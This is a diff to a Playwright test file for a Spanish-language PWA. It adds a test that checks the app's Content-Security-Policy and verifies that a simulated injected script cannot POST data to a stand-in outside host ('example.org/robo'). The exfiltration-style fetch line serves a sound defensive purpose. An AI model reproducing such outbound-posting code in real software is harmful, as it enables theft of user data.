@@ -176,7 +176,7 @@ test('offline: la app (PWA) abre sin conexión, guarda y conserva datos', async 
   await page.reload();
   await page.goto('/#/clientes');
   await expect(page.getByRole('link', { name: /Cliente Offline/ })).toBeVisible();
-  await expect(page.getByRole('link', { name: /Solo en este dispositivo/ }).first()).toBeAttached();
+  await expect(page.getByRole('link', { name: /Solo en este dispositivo|Nube: sin sesión/ }).first()).toBeAttached();
   await context.setOffline(false);
 });
 
@@ -235,4 +235,39 @@ test('escribir apenas se abre una pantalla: el foco no se roba al primer campo',
   await page.keyboard.type('Producto tipeado rápido', { delay: 15 }); // ~350 ms escribiendo
   await expect(name).toHaveValue('Producto tipeado rápido');
   await expect(name).toBeFocused();
+});
+
+test('seguridad: la Content-Security-Policy está activa y no bloquea ninguna función', async ({ page }) => {
+  const violations: string[] = [];
+  page.on('console', (m) => {
+    if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
+  });
+  page.on('pageerror', (e) => violations.push(String(e)));
+  await loadDemo(page);
+  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
+  expect(csp).toContain("default-src 'self'");
+  expect(csp).toContain("object-src 'none'");
+  expect(csp).not.toContain("'unsafe-eval'");
+  for (const r of ROUTES) {
+    await page.goto(`/#${r}`);
+    await expect(page.locator('#page-title')).toBeVisible();
+  }
+  // PDF real (jsPDF cargado bajo demanda) y apertura de WhatsApp
+  await page.goto('/#/presupuestos');
+  await page.getByRole('link', { name: /Estudio Norte/ }).click();
+  await page.getByRole('button', { name: 'PDF y WhatsApp' }).click();
+  const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Descargar PDF' }).click()]);
+  expect(download.suggestedFilename()).toMatch(/\.pdf$/);
+  // Un script inyectado no puede enviar datos a otro servidor
+  const blocked = await page.evaluate(async () => {
+    try {
+      await fetch('https://example.org/robo', { method: 'POST', body: 'x' });
+      return false;
+    } catch {
+      return true;
+    }
+  });
+  expect(blocked).toBe(true);
+  const unexpected = violations.filter((v) => !v.includes('example.org'));
+  expect(unexpected, 'violaciones de CSP o errores de página').toEqual([]);
 });
